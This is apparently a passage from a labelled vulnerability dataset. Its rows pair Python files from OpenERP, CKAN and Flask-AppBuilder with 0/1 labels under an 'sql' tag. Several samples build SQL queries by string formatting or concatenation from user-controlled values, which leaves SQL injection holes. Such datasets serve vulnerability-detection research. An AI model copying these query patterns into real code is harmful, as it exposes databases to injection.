        id2 = data_obj._get_id(cr, uid, 'account', 'view_bank_statement_tree')
        id3 = data_obj._get_id(cr, uid, 'account', 'view_bank_statement_form2')
        if id2:
            id2 = data_obj.browse(cr, uid, id2, context=context).res_id
        if id3:
            id3 = data_obj.browse(cr, uid, id3, context=context).res_id

        return {
            'domain': ""[('state','=','open')]"",
            'name': 'Open Statement',
            'view_type': 'form',
            'view_mode': 'tree,form',
            'res_model': 'account.bank.statement',
            'views': [(id2, 'tree'),(id3, 'form')],
            'type': 'ir.actions.act_window'
}
pos_open_statement()

# vim:expandtab:smartindent:tabstop=4:softtabstop=4:shiftwidth=4:
/n/n/n",0,sql
15,39,b48fb1cde6b7bbc49f502974a034ee1cf7e87e6c,"/addons/point_of_sale/wizard/pos_close_statement.py/n/n# -*- coding: utf-8 -*-
##############################################################################
#
#    OpenERP, Open Source Management Solution
#    Copyright (C) 2004-2010 Tiny SPRL (<http://tiny.be>).
#
#    This program is free software: you can redistribute it and/or modify
#    it under the terms of the GNU Affero General Public License as
#    published by the Free Software Foundation, either version 3 of the
#    License, or (at your option) any later version.
#
#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU Affero General Public License for more details.
#
#    You should have received a copy of the GNU Affero General Public License
#    along with this program.  If not, see <http://www.gnu.org/licenses/>.
#
##############################################################################

from osv import osv
from tools.translate import _

class pos_close_statement(osv.osv_memory):
    _name = 'pos.close.statement'
    _description = 'Close Statements'

    def close_statement(self, cr, uid, ids, context):
        """"""
             Close the statements
             @param self: The object pointer.
             @param cr: A database cursor
             @param uid: ID of the user currently logged in
             @param context: A standard dictionary
             @return : Blank Dictionary
        """"""
        company_id = self.pool.get('res.users').browse(cr, uid, uid).company_id.id
        list_statement = []
        mod_obj = self.pool.get('ir.model.data')
        statement_obj = self.pool.get('account.bank.statement')
        journal_obj = self.pool.get('account.journal')
        cr.execute(""""""select DISTINCT journal_id from pos_journal_users where user_id=%d order by journal_id""""""%(uid))
        j_ids = map(lambda x1: x1[0], cr.fetchall())
        cr.execute("""""" select id from account_journal
                            where auto_cash='True' and type='cash'
                            and id in (%s)"""""" %(','.join(map(lambda x: ""'"" + str(x) + ""'"", j_ids))))
        journal_ids = map(lambda x1: x1[0], cr.fetchall())

        for journal in journal_obj.browse(cr, uid, journal_ids):
            ids = statement_obj.search(cr, uid, [('state', '!=', 'confirm'), ('user_id', '=', uid), ('journal_id', '=', journal.id)])
            if not ids:
                raise osv.except_osv(_('Message'), _('Journals are already closed'))
            else:
                list_statement.append(ids[0])
                if not journal.check_dtls:
                    statement_obj.button_confirm_cash(cr, uid, ids, context)
    #        if not list_statement:
    #            return {}
    #        model_data_ids = mod_obj.search(cr, uid,[('model','=','ir.ui.view'),('name','=','view_bank_statement_tree')], context=context)
    #        resource_id = mod_obj.read(cr, uid, model_data_ids, fields=['res_id'], context=context)[0]['res_id']

        data_obj = self.pool.get('ir.model.data')
        id2 = data_obj._get_id(cr, uid, 'account', 'view_bank_statement_tree')
        id3 = data_obj._get_id(cr, uid, 'account', 'view_bank_statement_form2')
        if id2:
            id2 = data_obj.browse(cr, uid, id2, context=context).res_id
        if id3:
            id3 = data_obj.browse(cr, uid, id3, context=context).res_id
        return {
                'domain': ""[('id','in',"" + str(list_statement) + "")]"",
                'name': 'Close Statements',
                'view_type': 'form',
                'view_mode': 'tree,form',
                'res_model': 'account.bank.statement',
                'views': [(id2, 'tree'),(id3, 'form')],
                'type': 'ir.actions.act_window'}

pos_close_statement()

# vim:expandtab:smartindent:tabstop=4:softtabstop=4:shiftwidth=4:
/n/n/n/addons/point_of_sale/wizard/pos_open_statement.py/n/n# -*- coding: utf-8 -*-
##############################################################################
#
#    OpenERP, Open Source Management Solution
#    Copyright (C) 2004-2010 Tiny SPRL (<http://tiny.be>).
#
#    This program is free software: you can redistribute it and/or modify
#    it under the terms of the GNU Affero General Public License as
#    published by the Free Software Foundation, either version 3 of the
#    License, or (at your option) any later version.
#
#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU Affero General Public License for more details.
#
#    You should have received a copy of the GNU Affero General Public License
#    along with this program.  If not, see <http://www.gnu.org/licenses/>.
#
##############################################################################

from osv import osv
from tools.translate import _
import time

class pos_open_statement(osv.osv_memory):
    _name = 'pos.open.statement'
    _description = 'Open Statements'

    def open_statement(self, cr, uid, ids, context):
        """"""
             Open the statements
             @param self: The object pointer.
             @param cr: A database cursor
             @param uid: ID of the user currently logged in
             @param context: A standard dictionary
             @return : Blank Directory
        """"""
        list_statement = []
        mod_obj = self.pool.get('ir.model.data')
        company_id = self.pool.get('res.users').browse(cr, uid, uid).company_id.id
        statement_obj = self.pool.get('account.bank.statement')
        sequence_obj = self.pool.get('ir.sequence')
        journal_obj = self.pool.get('account.journal')
        cr.execute(""""""select DISTINCT journal_id from pos_journal_users where user_id=%d order by journal_id""""""%(uid))
        j_ids = map(lambda x1: x1[0], cr.fetchall())
        cr.execute("""""" select id from account_journal
                            where auto_cash='True' and type='cash'
                            and id in (%s)"""""" %(','.join(map(lambda x: ""'"" + str(x) + ""'"", j_ids))))
        journal_ids = map(lambda x1: x1[0], cr.fetchall())

        for journal in journal_obj.browse(cr, uid, journal_ids):
            ids = statement_obj.search(cr, uid, [('state', '!=', 'confirm'), ('user_id', '=', uid), ('journal_id', '=', journal.id)])
            if len(ids):
                raise osv.except_osv(_('Message'), _('You can not open a Cashbox for ""%s"". \n Please close the cashbox related to. ' %(journal.name)))
            
#            cr.execute("""""" Select id from account_bank_statement
#                                    where journal_id =%d
#                                    and company_id =%d
#                                    order by id desc limit 1"""""" %(journal.id, company_id))
#            st_id = cr.fetchone()
            
            number = ''
            if journal.sequence_id:
                number = sequence_obj.get_id(cr, uid, journal.sequence_id.id)
            else:
                number = sequence_obj.get(cr, uid, 'account.bank.statement')
            
            statement_id = statement_obj.create(cr, uid, {'journal_id': journal.id,
                                                          'company_id': company_id,
                                                          'user_id': uid,
                                                          'state': 'open',
                                                          'name': number,
                                                          'starting_details_ids': statement_obj._get_cash_close_box_lines(cr, uid, []),
                                                      })
            statement_obj.button_open(cr, uid, [statement_id], context)

    #            period = statement_obj._get_period(cr, uid, context) or None
    #            cr.execute(""INSERT INTO account_bank_statement(journal_id,company_id,user_id,state,name, period_id,date) VALUES(%d,%d,%d,'open','%s',%d,'%s')""%(journal.id, company_id, uid, number, period, time.strftime('%Y-%m-%d %H:%M:%S')))
    #            cr.commit()
    #            cr.execute(""select id from account_bank_statement where journal_id=%d and company_id=%d and user_id=%d and state='open' and name='%s'""%(journal.id, company_id, uid, number))
    #            statement_id = cr.fetchone()[0]
    #            print ""statement_id"",statement_id
    #            if st_id:
    #                statemt_id = statement_obj.browse(cr, uid, st_id[0])
    #                list_statement.append(statemt_id.id)
    #                if statemt_id and statemt_id.ending_details_ids:
    #                    statement_obj.write(cr, uid, [statement_id], {
    #                        'balance_start': statemt_id.balance_end,
    #                        'state': 'open',
    #                    })
    #                    if statemt_id.ending_details_ids:
    #                        for i in statemt_id.ending_details_ids:
    #                            c = statement_obj.create(cr, uid, {
    #                                'pieces': i.pieces,
    #                                'number': i.number,
    #                                'starting_id': statement_id,
    #                            })
        data_obj = self.pool.get('ir.model.data')
        id2 = data_obj._get_id(cr, uid, 'account', 'view_bank_statement_tree')
        id3 = data_obj._get_id(cr, uid, 'account', 'view_bank_statement_form2')
        if id2:
            id2 = data_obj.browse(cr, uid, id2, context=context).res_id
        if id3:
            id3 = data_obj.browse(cr, uid, id3, context=context).res_id

        return {
#           'domain': ""[('id','in', [""+','.join(map(str,list_statement))+""])]"",
            'domain': ""[('state','=','open')]"",
            'name': 'Open Statement',
            'view_type': 'form',
            'view_mode': 'tree,form',
            'res_model': 'account.bank.statement',
            'views': [(id2, 'tree'),(id3, 'form')],
            'type': 'ir.actions.act_window'
}
pos_open_statement()

# vim:expandtab:smartindent:tabstop=4:softtabstop=4:shiftwidth=4:
/n/n/n",1,sql
16,2,f020853c54a1851f196d7fd8897c4620bccf9f6c,"ckan/models/package.py/n/nimport sqlobject

try:
    # vdm >= 0.2
    import vdm.sqlobject.base as vdmbase
    from vdm.sqlobject.base import State
except:
    # vdm == 0.1
    import vdm.base as vdmbase
    from vdm.base import State

# American spelling ...
class License(sqlobject.SQLObject):

    class sqlmeta:
        _defaultOrder = 'name'

    name = sqlobject.UnicodeCol(alternateID=True)
    packages = sqlobject.MultipleJoin('Package')


class PackageRevision(vdmbase.ObjectRevisionSQLObject):

    base = sqlobject.ForeignKey('Package', cascade=True)
    title = sqlobject.UnicodeCol(default=None)
    url = sqlobject.UnicodeCol(default=None)
    download_url = sqlobject.UnicodeCol(default=None)
    license = sqlobject.ForeignKey('License', default=None)
    notes = sqlobject.UnicodeCol(default=None)


class TagRevision(vdmbase.ObjectRevisionSQLObject):

    base = sqlobject.ForeignKey('Tag', cascade=True)


class PackageTagRevision(vdmbase.ObjectRevisionSQLObject):

    base = sqlobject.ForeignKey('PackageTag', cascade=True)


class Package(vdmbase.VersionedDomainObject):

    sqlobj_version_class = PackageRevision
    versioned_attributes = vdmbase.get_attribute_names(sqlobj_version_class)
    
    name = sqlobject.UnicodeCol(alternateID=True)

    # should be attribute_name, module_name, module_object
    m2m = [ ('tags', 'ckan.models.package', 'Tag', 'PackageTag') ]

    def add_tag_by_name(self, tagname):
        try:
            tag = self.revision.model.tags.get(tagname)
        except: # TODO: make this specific
            tag = self.transaction.model.tags.create(name=tagname)
        self.tags.create(tag=tag)


class Tag(vdmbase.VersionedDomainObject):

    sqlobj_version_class = TagRevision

    name = sqlobject.UnicodeCol(alternateID=True)
    versioned_attributes = vdmbase.get_attribute_names(sqlobj_version_class)

    m2m = [ ('packages', 'ckan.models.package', 'Package', 'PackageTag') ]

    @classmethod
    def search_by_name(self, text_query):
        text_query = str(text_query) # SQLObject chokes on unicode.
        return self.select(self.q.name.contains(text_query.lower()))


class PackageTag(vdmbase.VersionedDomainObject):

    sqlobj_version_class = PackageTagRevision
    versioned_attributes = vdmbase.get_attribute_names(sqlobj_version_class)
    m2m = []

    package = sqlobject.ForeignKey('Package', cascade=True)
    tag = sqlobject.ForeignKey('Tag', cascade=True)

    package_tag_index = sqlobject.DatabaseIndex('package', 'tag',
            unique=True)

/n/n/n",0,sql
17,3,f020853c54a1851f196d7fd8897c4620bccf9f6c,"/ckan/models/package.py/n/nimport sqlobject

try:
    # vdm >= 0.2
    import vdm.sqlobject.base as vdmbase
    from vdm.sqlobject.base import State
except:
    # vdm == 0.1
    import vdm.base as vdmbase
    from vdm.base import State

# American spelling ...
class License(sqlobject.SQLObject):

    class sqlmeta:
        _defaultOrder = 'name'

    name = sqlobject.UnicodeCol(alternateID=True)
    packages = sqlobject.MultipleJoin('Package')


class PackageRevision(vdmbase.ObjectRevisionSQLObject):

    base = sqlobject.ForeignKey('Package', cascade=True)
    title = sqlobject.UnicodeCol(default=None)
    url = sqlobject.UnicodeCol(default=None)
    download_url = sqlobject.UnicodeCol(default=None)
    license = sqlobject.ForeignKey('License', default=None)
    notes = sqlobject.UnicodeCol(default=None)


class TagRevision(vdmbase.ObjectRevisionSQLObject):

    base = sqlobject.ForeignKey('Tag', cascade=True)


class PackageTagRevision(vdmbase.ObjectRevisionSQLObject):

    base = sqlobject.ForeignKey('PackageTag', cascade=True)


class Package(vdmbase.VersionedDomainObject):

    sqlobj_version_class = PackageRevision
    versioned_attributes = vdmbase.get_attribute_names(sqlobj_version_class)
    
    name = sqlobject.UnicodeCol(alternateID=True)

    # should be attribute_name, module_name, module_object
    m2m = [ ('tags', 'ckan.models.package', 'Tag', 'PackageTag') ]

    def add_tag_by_name(self, tagname):
        try:
            tag = self.revision.model.tags.get(tagname)
        except: # TODO: make this specific
            tag = self.transaction.model.tags.create(name=tagname)
        self.tags.create(tag=tag)


class Tag(vdmbase.VersionedDomainObject):

    sqlobj_version_class = TagRevision

    name = sqlobject.UnicodeCol(alternateID=True)
    versioned_attributes = vdmbase.get_attribute_names(sqlobj_version_class)

    m2m = [ ('packages', 'ckan.models.package', 'Package', 'PackageTag') ]

    @classmethod
    def search_by_name(self, text_query):
        text_query_str = str(text_query) # SQLObject chokes on unicode.
        # Todo: Change to use SQLObject statement objects.
        sql_query = ""UPPER(tag.name) LIKE UPPER('%%%s%%')"" % text_query_str
        return self.select(sql_query)


class PackageTag(vdmbase.VersionedDomainObject):

    sqlobj_version_class = PackageTagRevision
    versioned_attributes = vdmbase.get_attribute_names(sqlobj_version_class)
    m2m = []

    package = sqlobject.ForeignKey('Package', cascade=True)
    tag = sqlobject.ForeignKey('Tag', cascade=True)

    package_tag_index = sqlobject.DatabaseIndex('package', 'tag',
            unique=True)

/n/n/n",1,sql
18,150,2158db051408e0d66210a99b17c121be008e20b6,"flask_appbuilder/models/sqla/interface.py/n/n# -*- coding: utf-8 -*-
import sys
import logging
import sqlalchemy as sa

from . import filters
from sqlalchemy.orm import joinedload
from sqlalchemy.exc import IntegrityError
from sqlalchemy import func
from sqlalchemy.orm.properties import SynonymProperty

from ..base import BaseInterface
from ..group import GroupByDateYear, GroupByDateMonth, GroupByCol
from ..mixins import FileColumn, ImageColumn
from ...filemanager import FileManager, ImageManager
from ..._compat import as_unicode
from ...const import LOGMSG_ERR_DBI_ADD_GENERIC, LOGMSG_ERR_DBI_EDIT_GENERIC, LOGMSG_ERR_DBI_DEL_GENERIC, \
    LOGMSG_WAR_DBI_ADD_INTEGRITY, LOGMSG_WAR_DBI_EDIT_INTEGRITY, LOGMSG_WAR_DBI_DEL_INTEGRITY

log = logging.getLogger(__name__)


def _include_filters(obj):
    for key in filters.__all__:
        if not hasattr(obj, key):
            setattr(obj, key, getattr(filters, key))


class SQLAInterface(BaseInterface):
    """"""
    SQLAModel
    Implements SQLA support methods for views
    """"""
    session = None

    filter_converter_class = filters.SQLAFilterConverter

    def __init__(self, obj, session=None):
        _include_filters(self)
        self.list_columns = dict()
        self.list_properties = dict()

        self.session = session
        # Collect all SQLA columns and properties
        for prop in sa.orm.class_mapper(obj).iterate_properties:
            if type(prop) != SynonymProperty:
                self.list_properties[prop.key] = prop
        for col_name in obj.__mapper__.columns.keys():
            if col_name in self.list_properties:
                self.list_columns[col_name] = obj.__mapper__.columns[col_name]
        super(SQLAInterface, self).__init__(obj)

    @property
    def model_name(self):
        """"""
            Returns the models class name
            useful for auto title on views
        """"""
        return self.obj.__name__

    def _get_base_query(self, query=None, filters=None, order_column='', order_direction=''):
        if filters:
            query = filters.apply_all(query)
        if order_column != '':
            # if Model has custom decorator **renders('<COL_NAME>')**
            # this decorator will add a property to the method named *_col_name*
            if hasattr(self.obj, order_column):
                if hasattr(getattr(self.obj, order_column), '_col_name'):
                    order_column = getattr(getattr(self.obj, order_column), '_col_name')
            query = query.order_by(""%s %s"" % (order_column, order_direction))
        return query

    def query(self, filters=None, order_column='', order_direction='',
              page=None, page_size=None):
        """"""
            QUERY
            :param filters:
                dict with filters {<col_name>:<value,...}
            :param order_column:
                name of the column to order
            :param order_direction:
                the direction to order <'asc'|'desc'>
            :param page:
                the current page
            :param page_size:
                the current page size

        """"""
        query = self.session.query(self.obj)
        if len(order_column.split('.')) >= 2:
            tmp_order_column = ''
            for join_relation in order_column.split('.')[:-1]:
                model_relation = self.get_related_model(join_relation)
                query = query.join(model_relation)
                # redefine order column name, because relationship can have a different name
                # from the related table name.
                tmp_order_column = tmp_order_column + model_relation.__tablename__ + '.'
            order_column = tmp_order_column + order_column.split('.')[-1]
        query_count = self.session.query(func.count('*')).select_from(self.obj)

        query_count = self._get_base_query(query=query_count,
                                           filters=filters)
        query = self._get_base_query(query=query,
                                     filters=filters,
                                     order_column=order_column,
                                     order_direction=order_direction)

        count = query_count.scalar()

        if page:
            query = query.offset(page * page_size)
        if page_size:
            query = query.limit(page_size)

        return count, query.all()

    def query_simple_group(self, group_by='', aggregate_func=None, aggregate_col=None, filters=None):
        query = self.session.query(self.obj)
        query = self._get_base_query(query=query, filters=filters)
        query_result = query.all()
        group = GroupByCol(group_by, 'Group by')
        return group.apply(query_result)

    def query_month_group(self, group_by='', filters=None):
        query = self.session.query(self.obj)
        query = self._get_base_query(query=query, filters=filters)
        query_result = query.all()
        group = GroupByDateMonth(group_by, 'Group by Month')
        return group.apply(query_result)

    def query_year_group(self, group_by='', filters=None):
        query = self.session.query(self.obj)
        query = self._get_base_query(query=query, filters=filters)
        query_result = query.all()
        group_year = GroupByDateYear(group_by, 'Group by Year')
        return group_year.apply(query_result)

    """"""
    -----------------------------------------
         FUNCTIONS for Testing TYPES
    -----------------------------------------
    """"""

    def is_image(self, col_name):
        try:
            return isinstance(self.list_columns[col_name].type, ImageColumn)
        except:
            return False

    def is_file(self, col_name):
        try:
            return isinstance(self.list_columns[col_name].type, FileColumn)
        except:
            return False

    def is_string(self, col_name):
        try:
            return isinstance(self.list_columns[col_name].type, sa.types.String)
        except:
            return False

    def is_text(self, col_name):
        try:
            return isinstance(self.list_columns[col_name].type, sa.types.Text)
        except:
            return False

    def is_integer(self, col_name):
        try:
            return isinstance(self.list_columns[col_name].type, sa.types.Integer)
        except:
            return False

    def is_numeric(self, col_name):
        try:
            return isinstance(self.list_columns[col_name].type, sa.types.Numeric)
        except:
            return False

    def is_float(self, col_name):
        try:
            return isinstance(self.list_columns[col_name].type, sa.types.Float)
        except:
            return False

    def is_boolean(self, col_name):
        try:
            return isinstance(self.list_columns[col_name].type, sa.types.Boolean)
        except:
            return False

    def is_date(self, col_name):
        try:
            return isinstance(self.list_columns[col_name].type, sa.types.Date)
        except:
            return False

    def is_datetime(self, col_name):
        try:
            return isinstance(self.list_columns[col_name].type, sa.types.DateTime)
        except:
            return False

    def is_relation(self, col_name):
        try:
            return isinstance(self.list_properties[col_name], sa.orm.properties.RelationshipProperty)
        except:
            return False

    def is_relation_many_to_one(self, col_name):
        try:
            if self.is_relation(col_name):
                return self.list_properties[col_name].direction.name == 'MANYTOONE'
        except:
            return False

    def is_relation_many_to_many(self, col_name):
        try:
            if self.is_relation(col_name):
                return self.list_properties[col_name].direction.name == 'MANYTOMANY'
        except:
            return False

    def is_relation_one_to_one(self, col_name):
        try:
            if self.is_relation(col_name):
                return self.list_properties[col_name].direction.name == 'ONETOONE'
        except:
            return False

    def is_relation_one_to_many(self, col_name):
        try:
            if self.is_relation(col_name):
                return self.list_properties[col_name].direction.name == 'ONETOMANY'
        except:
            return False

    def is_nullable(self, col_name):
        if self.is_relation_many_to_one(col_name):
            col = self.get_relation_fk(col_name)
            return col.nullable
        try:
            return self.list_columns[col_name].nullable
        except:
            return False

    def is_unique(self, col_name):
        try:
            return self.list_columns[col_name].unique
        except:
            return False

    def is_pk(self, col_name):
        try:
            return self.list_columns[col_name].primary_key
        except:
            return False

    def is_fk(self, col_name):
        try:
            return self.list_columns[col_name].foreign_keys
        except:
            return False

    def get_max_length(self, col_name):
        try:
            col = self.list_columns[col_name]
            if col.type.length:
                return col.type.length
            else:
                return -1
        except:
            return -1

    """"""
    -------------------------------
     FUNCTIONS FOR CRUD OPERATIONS
    -------------------------------
    """"""

    def add(self, item):
        try:
            self.session.add(item)
            self.session.commit()
            self.message = (as_unicode(self.add_row_message), 'success')
            return True
        except IntegrityError as e:
            self.message = (as_unicode(self.add_integrity_error_message), 'warning')
            log.warning(LOGMSG_WAR_DBI_ADD_INTEGRITY.format(str(e)))
            self.session.rollback()
            return False
        except Exception as e:
            self.message = (as_unicode(self.general_error_message + ' ' + str(sys.exc_info()[0])), 'danger')
            log.exception(LOGMSG_ERR_DBI_ADD_GENERIC.format(str(e)))
            self.session.rollback()
            return False

    def edit(self, item):
        try:
            self.session.merge(item)
            self.session.commit()
            self.message = (as_unicode(self.edit_row_message), 'success')
            return True
        except IntegrityError as e:
            self.message = (as_unicode(self.edit_integrity_error_message), 'warning')
            log.warning(LOGMSG_WAR_DBI_EDIT_INTEGRITY.format(str(e)))
            self.session.rollback()
            return False
        except Exception as e:
            self.message = (as_unicode(self.general_error_message + ' ' + str(sys.exc_info()[0])), 'danger')
            log.exception(LOGMSG_ERR_DBI_EDIT_GENERIC.format(str(e)))
            self.session.rollback()
            return False

    def delete(self, item):
        try:
            self._delete_files(item)
            self.session.delete(item)
            self.session.commit()
            self.message = (as_unicode(self.delete_row_message), 'success')
            return True
        except IntegrityError as e:
            self.message = (as_unicode(self.delete_integrity_error_message), 'warning')
            log.warning(LOGMSG_WAR_DBI_DEL_INTEGRITY.format(str(e)))
            self.session.rollback()
            return False
        except Exception as e:
            self.message = (as_unicode(self.general_error_message + ' ' + str(sys.exc_info()[0])), 'danger')
            log.exception(LOGMSG_ERR_DBI_DEL_GENERIC.format(str(e)))
            self.session.rollback()
            return False

    def delete_all(self, items):
        try:
            for item in items:
                self._delete_files(item)
                self.session.delete(item)
            self.session.commit()
            self.message = (as_unicode(self.delete_row_message), 'success')
            return True
        except IntegrityError as e:
            self.message = (as_unicode(self.delete_integrity_error_message), 'warning')
            log.warning(LOGMSG_WAR_DBI_DEL_INTEGRITY.format(str(e)))
            self.session.rollback()
            return False
        except Exception as e:
            self.message = (as_unicode(self.general_error_message + ' ' + str(sys.exc_info()[0])), 'danger')
            log.exception(LOGMSG_ERR_DBI_DEL_GENERIC.format(str(e)))
            self.session.rollback()
            return False

    """"""
    -----------------------
     FILE HANDLING METHODS
    -----------------------
    """"""

    def _add_files(self, this_request, item):
        fm = FileManager()
        im = ImageManager()
        for file_col in this_request.files:
            if self.is_file(file_col):
                fm.save_file(this_request.files[file_col], getattr(item, file_col))
        for file_col in this_request.files:
            if self.is_image(file_col):
                im.save_file(this_request.files[file_col], getattr(item, file_col))

    def _delete_files(self, item):
        for file_col in self.get_file_column_list():
            if self.is_file(file_col):
                if getattr(item, file_col):
                    fm = FileManager()
                    fm.delete_file(getattr(item, file_col))
        for file_col in self.get_image_column_list():
            if self.is_image(file_col):
                if getattr(item, file_col):
                    im = ImageManager()
                    im.delete_file(getattr(item, file_col))

    """"""
    ------------------------------
     FUNCTIONS FOR RELATED MODELS
    ------------------------------
    """"""

    def get_col_default(self, col_name):
        default = getattr(self.list_columns[col_name], 'default', None)
        if default is not None:
            value = getattr(default, 'arg', None)
            if value is not None:
                if getattr(default, 'is_callable', False):
                    return lambda: default.arg(None)
                else:
                    if not getattr(default, 'is_scalar', True):
                        return None
                return value

    def get_related_model(self, col_name):
        return self.list_properties[col_name].mapper.class_

    def query_model_relation(self, col_name):
        model = self.get_related_model(col_name)
        return self.session.query(model).all()

    def get_related_interface(self, col_name):
        return self.__class__(self.get_related_model(col_name), self.session)

    def get_related_obj(self, col_name, value):
        rel_model = self.get_related_model(col_name)
        return self.session.query(rel_model).get(value)

    def get_related_fks(self, related_views):
        return [view.datamodel.get_related_fk(self.obj) for view in related_views]

    def get_related_fk(self, model):
        for col_name in self.list_properties.keys():
            if self.is_relation(col_name):
                if model == self.get_related_model(col_name):
                    return col_name

    """"""
    ------------- 
     GET METHODS
    -------------
    """"""

    def get_columns_list(self):
        """"""
            Returns all model's columns on SQLA properties
        """"""
        return list(self.list_properties.keys())

    def get_user_columns_list(self):
        """"""
            Returns all model's columns except pk or fk
        """"""
        ret_lst = list()
        for col_name in self.get_columns_list():
            if (not self.is_pk(col_name)) and (not self.is_fk(col_name)):
                ret_lst.append(col_name)
        return ret_lst

    # TODO get different solution, more integrated with filters
    def get_search_columns_list(self):
        ret_lst = list()
        for col_name in self.get_columns_list():
            if not self.is_relation(col_name):
                tmp_prop = self.get_property_first_col(col_name).name
                if (not self.is_pk(tmp_prop)) and \
                        (not self.is_fk(tmp_prop)) and \
                        (not self.is_image(col_name)) and \
                        (not self.is_file(col_name)) and \
                        (not self.is_boolean(col_name)):
                    ret_lst.append(col_name)
            else:
                ret_lst.append(col_name)
        return ret_lst

    def get_order_columns_list(self, list_columns=None):
        """"""
            Returns the columns that can be ordered

            :param list_columns: optional list of columns name, if provided will
                use this list only.
        """"""
        ret_lst = list()
        list_columns = list_columns or self.get_columns_list()
        for col_name in list_columns:
            if not self.is_relation(col_name):
                if hasattr(self.obj, col_name):
                    if (not hasattr(getattr(self.obj, col_name), '__call__') or
                            hasattr(getattr(self.obj, col_name), '_col_name')):
                        ret_lst.append(col_name)
                else:
                    ret_lst.append(col_name)
        return ret_lst

    def get_file_column_list(self):
        return [i.name for i in self.obj.__mapper__.columns if isinstance(i.type, FileColumn)]

    def get_image_column_list(self):
        return [i.name for i in self.obj.__mapper__.columns if isinstance(i.type, ImageColumn)]

    def get_property_first_col(self, col_name):
        # support for only one col for pk and fk
        return self.list_properties[col_name].columns[0]

    def get_relation_fk(self, col_name):
        # support for only one col for pk and fk
        return list(self.list_properties[col_name].local_columns)[0]

    def get(self, id, filters=None):
        if filters:
            query = query = self.session.query(self.obj)
            _filters = filters.copy()
            _filters.add_filter(self.get_pk_name(), self.FilterEqual, id)
            query = self._get_base_query(query=query, filters=_filters)
            return query.first()
        return self.session.query(self.obj).get(id)

    def get_pk_name(self):
        for col_name in self.list_columns.keys():
            if self.is_pk(col_name):
                return col_name


""""""
    For Retro-Compatibility
""""""
SQLModel = SQLAInterface
/n/n/nflask_appbuilder/urltools.py/n/nimport re
from flask import request


class Stack(object):
    """"""
        Stack data structure will not insert
        equal sequential data
    """"""
    def __init__(self, list=None, size=5):
        self.size = size
        self.data = list or []

    def push(self, item):
        if self.data:
            if item != self.data[len(self.data) - 1]:
                self.data.append(item)
        else:
            self.data.append(item)
        if len(self.data) > self.size:
            self.data.pop(0)

    def pop(self):
        if len(self.data) == 0:
            return None
        return self.data.pop(len(self.data) - 1)

    def to_json(self):
        return self.data


def get_group_by_args():
    """"""
        Get page arguments for group by
    """"""
    group_by = request.args.get('group_by')
    if not group_by: group_by = ''
    return group_by


def get_page_args():
    """"""
        Get page arguments, returns a dictionary
        { <VIEW_NAME>: PAGE_NUMBER }

        Arguments are passed: page_<VIEW_NAME>=<PAGE_NUMBER>

    """"""
    pages = {}
    for arg in request.args:
        re_match = re.findall('page_(.*)', arg)
        if re_match:
            pages[re_match[0]] = int(request.args.get(arg))
    return pages


def get_page_size_args():
    """"""
        Get page size arguments, returns an int
        { <VIEW_NAME>: PAGE_NUMBER }

        Arguments are passed: psize_<VIEW_NAME>=<PAGE_SIZE>

    """"""
    page_sizes = {}
    for arg in request.args:
        re_match = re.findall('psize_(.*)', arg)
        if re_match:
            page_sizes[re_match[0]] = int(request.args.get(arg))
    return page_sizes


def get_order_args():
    """"""
        Get order arguments, return a dictionary
        { <VIEW_NAME>: (ORDER_COL, ORDER_DIRECTION) }

        Arguments are passed like: _oc_<VIEW_NAME>=<COL_NAME>&_od_<VIEW_NAME>='asc'|'desc'

    """"""
    orders = {}
    for arg in request.args:
        re_match = re.findall('_oc_(.*)', arg)
        if re_match:
            order_direction = request.args.get('_od_' + re_match[0])
            if order_direction in ('asc', 'desc'):
                orders[re_match[0]] = (request.args.get(arg), order_direction)
    return orders


def get_filter_args(filters):
    filters.clear_filters()
    for arg in request.args:
        re_match = re.findall('_flt_(\d)_(.*)', arg)
        if re_match:
            filters.add_filter_index(re_match[0][1], int(re_match[0][0]), request.args.get(arg))
/n/n/n",0,sql
19,151,2158db051408e0d66210a99b17c121be008e20b6,"/flask_appbuilder/models/sqla/interface.py/n/n# -*- coding: utf-8 -*-
import sys
import logging
import sqlalchemy as sa

from . import filters
from sqlalchemy.orm import joinedload
from sqlalchemy.exc import IntegrityError
from sqlalchemy import func
from sqlalchemy.orm.properties import SynonymProperty

from ..base import BaseInterface
from ..group import GroupByDateYear, GroupByDateMonth, GroupByCol
from ..mixins import FileColumn, ImageColumn
from ...filemanager import FileManager, ImageManager
from ..._compat import as_unicode
from ...const import LOGMSG_ERR_DBI_ADD_GENERIC, LOGMSG_ERR_DBI_EDIT_GENERIC, LOGMSG_ERR_DBI_DEL_GENERIC, \
    LOGMSG_WAR_DBI_ADD_INTEGRITY, LOGMSG_WAR_DBI_EDIT_INTEGRITY, LOGMSG_WAR_DBI_DEL_INTEGRITY

log = logging.getLogger(__name__)


def _include_filters(obj):
    for key in filters.__all__:
        if not hasattr(obj, key):
            setattr(obj, key, getattr(filters, key))


class SQLAInterface(BaseInterface):
    """"""
    SQLAModel
    Implements SQLA support methods for views
    """"""
    session = None

    filter_converter_class = filters.SQLAFilterConverter

    def __init__(self, obj, session=None):
        _include_filters(self)
        self.list_columns = dict()
        self.list_properties = dict()

        self.session = session
        # Collect all SQLA columns and properties
        for prop in sa.orm.class_mapper(obj).iterate_properties:
            if type(prop) != SynonymProperty:
                self.list_properties[prop.key] = prop
        for col_name in obj.__mapper__.columns.keys():
            if col_name in self.list_properties:
                self.list_columns[col_name] = obj.__mapper__.columns[col_name]
        super(SQLAInterface, self).__init__(obj)

    @property
    def model_name(self):
        """"""
            Returns the models class name
            useful for auto title on views
        """"""
        return self.obj.__name__

    def _get_base_query(self, query=None, filters=None, order_column='', order_direction=''):
        if filters:
            query = filters.apply_all(query)
        if order_column != '':
            # if Model has custom decorator **renders('<COL_NAME>')**
            # this decorator will add a property to the method named *_col_name*
            if hasattr(self.obj, order_column):
                if hasattr(getattr(self.obj, order_column), '_col_name'):
                    order_column = getattr(getattr(self.obj, order_column), '_col_name')
            query = query.order_by(order_column + ' ' + order_direction)
        return query

    def query(self, filters=None, order_column='', order_direction='',
              page=None, page_size=None):
        """"""
            QUERY
            :param filters:
                dict with filters {<col_name>:<value,...}
            :param order_column:
                name of the column to order
            :param order_direction:
                the direction to order <'asc'|'desc'>
            :param page:
                the current page
            :param page_size:
                the current page size

